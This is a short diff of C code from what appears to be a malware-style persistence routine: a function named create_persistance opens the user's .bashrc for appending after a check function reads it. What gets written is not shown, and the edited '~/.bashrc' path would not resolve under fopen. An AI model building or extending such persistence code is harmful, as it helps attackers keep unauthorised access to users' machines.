@@ -7,7 +7,7 @@
 int NeedsMod()
 {
 
-    FILE *bashrc = fopen(".bashrc", "r");
+    FILE *bashrc = fopen("~/.bashrc", "r");
     
     if (!bashrc)
         return EXIT_FAILURE;
@@ -25,6 +25,7 @@ int NeedsMod()
             break;
         }
     }
+
     free(buffer);
     fclose(bashrc);
     return return_value;
@@ -34,7 +35,7 @@ int create_persistance()
 {
     if (NeedsMod())
     {
-        FILE *bashrc = fopen(".bashrc", "a");
+        FILE *bashrc = fopen("~/.bashrc", "a");
         
         if (!bashrc)
             return 1;
